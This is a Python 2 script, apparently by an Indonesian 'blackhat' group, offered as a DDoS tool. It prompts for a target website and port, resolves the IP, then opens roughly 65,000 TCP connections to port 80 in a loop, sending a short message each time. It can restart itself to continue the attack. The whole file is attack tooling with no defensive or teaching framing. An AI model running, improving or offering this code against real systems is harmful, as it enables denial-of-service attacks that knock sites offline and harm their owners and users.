####################
#python 2.7.6      #
#!/usr/bin/python  #
#Author: P47R1K21  #
#Hargai Karya Orang#
#Please No Recodee #
####################

import time
import sys
import socket
import os
import string

baner="""
\033[35;1m
		\033[35;1m+#################################+
		\033[35;1m|                                 |
		\033[35;1m| \033[36;1mAuthor: P47R1K21                \033[35;1m|
		\033[35;1m| \033[36;1mTeam  : Bastard Blackhat Family \033[35;1m|
		\033[35;1m| \033[36;1mCode  : Python2                 \033[35;1m|
		\033[35;1m| \033[36;1mTools : DDOS                    \033[35;1m|
		\033[35;1m| \033[36;1mThanks: Mr.B4J1N64N - Mantoed   \033[35;1m|
		\033[35;1m|                                 |
		\033[35;1m+#################################+
\033[35;1m
"""
print baner
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
print (" \033[31;1m Masukan URL Target!\033[36;1m [ Ex: www.site.com ]")
host=raw_input( "\033[32;1m  DDOS>>\033[35;1m " )
print (" \033[31;1m Masukan Port!\033[36;1m [ Ex: 8080 ]")
port=input("\033[32;1m  DDOS>>\033[35;1m ")
connect=65000
ip = socket.gethostbyname( host )
print 
print ( "\033[1;91m  Website \033[1;93m[" + host + "]" )
print ( "\033[1;91m  Ip \033[1;93m["+ ip + "]" )
message=("P47R1K21 Working!!...")
print 
print ("\033[1;91m  GASSKEUN!!!.........................")
print
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("\033[1;91m  ... Tidak Connect Ke Ip ->\033[34;1m [" + ip + "] ...")
    print ( "\033[1;92m  ... Serang ->\033[36;1m [ " + host + " ] ...")
    ddos.close()
for i in range(1, connect):
    dos()
print
print("  Ddos Berenti [Botnya Cape:v]!!.......")
if __name__ == "__main__":
    answer = raw_input("Mau Lanjut DDOS ??? ketik go untuk lanjut...")
    if answer.strip() in "y Y go Go GO".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")
else:
	print ("Bye Gaes")
